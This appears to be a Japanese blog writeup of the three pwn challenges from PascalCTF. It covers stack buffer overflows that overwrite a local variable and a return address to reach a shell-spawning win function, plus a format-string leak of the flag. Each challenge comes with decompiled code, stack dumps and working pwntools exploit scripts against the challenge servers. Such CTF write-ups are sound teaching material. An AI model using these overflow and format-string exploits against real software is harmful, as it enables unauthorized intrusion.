+++
date = 2025-03-21
title = "PascalCTF Writeup"
[taxonomies]
tags = ["CTF"]
+++

# これは何
PascalCTFのwriteupです。例のごとく私はpwnしか解答していません。なんなら開催時間が5時間かつ寝たので3問中1問しか回答できませんでしたが、pwn全問の解答を掲載します。

# Morris Worm
接続先とバイナリが配布されます。以下はGhidraの解析結果です。
```c
undefined8 main(void)

{
  EVP_PKEY_CTX *ctx;
  char local_38 [44];
  int local_c;
  
  signal(0xe,handle_alarm);
  ctx = (EVP_PKEY_CTX *)0x1e;
  alarm(0x1e);
  init(ctx);
  local_c = 0x45;
  puts("Do you want to say something?");
  fgets(local_38,0x539,stdin);
  if (local_c == 0x539) {
    puts("Welcome back Kevin !");
    win();
  }
  else {
    puts("Bye");
  }
  return 0;
}
```
典型的なBOFで、local_cを0x539に上書きするような問題になっていると分かります。

また、下記はGBDでスタックを覗いた時の結果です。
```
0x7fffffffe140: 0x0000000000000a41      0x0000000000000000
0x7fffffffe150: 0x0000000000000000      0x00007ffff7fe49f0
                                                +--- これ0x539に書き換えたい
                                                |
0x7fffffffe160: 0x0000000000000000      0x00000045ffffe298
0x7fffffffe170: 0x00007fffffffe210      0x00007ffff7dbb488
```
0x0a41は僕の入力「A\n」です。また0x45がある位置がlocal_cの領域であると分かります。

よって、44byteの入力バッファの先に上書きしたいlocal_cの値があると分かりました。これを元にsolverを書きます。
```python
from pwn import *
file = './worm'
elf = context.binary = ELF(file)
#p = process(file)
p = remote("morrisworm.challs.pascalctf.it", 1337)

p.recvline()

payload = b'A'*44
payload += b'\x39\x05\x00\x00'
p.sendline(payload)

p.interactive()
```

フラグ: `pascalCTF{y0u_F0uNd-Th3_n3w_mi113n1um-bug???}`

# Unpwnable_shop
接続先とバイナリが貰えるので、またGhidraで解析します(変な変数は私がそう命名しただけ)
```c
undefined8 main(void)

{
  EVP_PKEY_CTX *ctx;
  int menu_select;
  char name[76] [76];
  int input_size;
  
  signal(0xe,handle_alarm);
  ctx = (EVP_PKEY_CTX *)0x1e;
  alarm(0x1e);
  init(ctx);
  input_size = 81;
  puts("Welcome to Unpwnable shop!\n***Now with support for abnormally long usernames!!1!***");
  puts(
      "To continue insert your name (don\'t even think about overwriting some return addresses, you ca n\'t lmao) :"
      );
  fgets(name[76],input_size,(FILE *)stdin);
  printf("Welcome to the shop %s\n\n\n",name[76]);
  printMenu();
  scanf(&%d,&menu_select);
  getchar();
  if (menu_select != 0) {
    puts("finding stuff to sell...");
    sleep(1);
    if (menu_select == 69) {
      puts("What was your name again? I forgot it.");
      fgets(name[76],input_size,(FILE *)stdin);
      puts("Ok, just hold on while i finish searching.");
      sleep(2);
    }
    puts("didn\'t find anything :(");
  }
  puts("Bye!");
  return 0;
}
```
実行したときには分かりませんでしたが、メニュー選択として0か1の入力を要求される時に、69を入力すると、二度目の名前入力を求められる処理へと遷移します。

ここで、`if (menu_select == 69)`直前ののスタックを見て見ました。

```
                                        menu selec
0x7fffffffe130: 0x000000000000000f      0x00000045 00000000

				buf
0x7fffffffe140: 0x0000000a41414141      0x000000000009928d
0x7fffffffe150: 0x00007fffffffe180      0x0000000000421d42
0x7fffffffe160: 0x00000000004b83c0      0x00000000004c80e8
0x7fffffffe170: 0x0000000000000000      0x00000000004cf2b8
0x7fffffffe180: 0x00007fffffffe1a0      01 00 00 00 00 | 51 00 00 00

0x7fffffffe190: 0x00007fffffffe230      0x00000000004037b8
```

0x0a41414141は私の入力「AAAA\n」であり、名前バッファ(name)と分かります。またその76byte先には0x51という数値が存在しており、これは10進数で81です。つまり、nameの先にはinput_sizeが存在していました。

さらには一度目の名前入力で、76byteのバッファ(name)には81byteの入力が許容されているため、input_sizeを81byteと言わずにリターンアドレスが存在する96byteに変更することもできます。

こうすれば1回目の81byteの入力ではnameから届かなかったリターンアドレスが、2度目の96byteの名前入力で上書きが可能となります。

また、win関数も存在していました(下記)

```c
void win(void)

{
  execve("/bin/sh",(char **)0x0,(char **)0x0);
  return;
}
```

シェルを起動するものなので、この関数アドレスでリターンアドレスを上書きすれば良いと分かります。これらの結果から作成したsolverが以下です。

```python
from pwn import *
file = './unpwnable'
elf = context.binary = ELF(file)
#p = process(file)
p = remote('unpwnable.challs.pascalctf.it', 1338)

payload = b'A'*76 + b'\x62'
p.sendline(payload)
p.recvuntil(b'stuff\n')
p.sendline(b'69')
p.recvuntil(b'it.\n')

payload = b'A'*88 + p64(elf.sym['win'])
p.sendline(payload)

p.interactive()
```
フラグ: `pascalCTF{N0O0o0o@O0_Hòw_D1D_Y0U_D0_17}`

# E.L.I.A
バイナリの解析結果は以下。
```c
undefined8 main(void)

{
  FILE *flag_fd;
  undefined8 uVar1;
  char *pcVar2;
  EVP_PKEY_CTX *ctx;
  long in_FS_OFFSET;
  char local_68 [38];
  undefined local_42;
  char local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  signal(0xe,handle_alarm);
  ctx = (EVP_PKEY_CTX *)0x1e;
  alarm(0x1e);
  init(ctx);
  flag_fd = fopen("flag.txt","r");
  if (flag_fd == (FILE *)0x0) {
    puts("Error: File not found");
    uVar1 = 1;
  }
  else {
    pcVar2 = fgets(local_68,0x26,flag_fd);
    if (pcVar2 == (char *)0x0) {
      puts("Error: Flag file is empty");
      uVar1 = 1;
    }
    else {
      fclose(flag_fd);
      local_42 = 0;
      puts("Wow, it actually compiled! Do you want to write something?");
      fgets(local_38,0x1e,stdin);
      printf(local_38);
      uVar1 = 0;
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    /* WARNING: Subroutine does not return * /
    __stack_chk_fail();
  }
  return uVar1;
}
```
FSBが存在しており、かつフラグは読まれてスタックに格納されていることが分かります。`%s`で読み出そうとするとなんかうまく行かないので`%p`で0から20番目までの引数を読み出してみたところ、8から12番目に印字可能な数値が続いていました。これを考慮して適当にsolverを書きます。
```python
from pwn import *
file = './elia'
elf = context.binary = ELF(file)

p = remote('elia.challs.pascalctf.it', 1339)
p.recvline()

payload = ''
for i in range(8, 13):
    payload += f'%{i}$p'

p.sendline(payload)

flag = [int(i, 16) for i in p.recvline().decode().split('0x')[1:]]
pascal = ''
for i in flag:
    pascal += i.to_bytes(8, 'little').decode()

pascal = pascal.replace('\x00', '')
print(pascal)

```

フラグ: `pascalCTF{n0_pr1ntf-vulns-n0_fun@4ll}`

# 最後に
CTFは日本時間だと深夜開催(0-5時)。その日は予定があることを忘れており、結局寝ました。
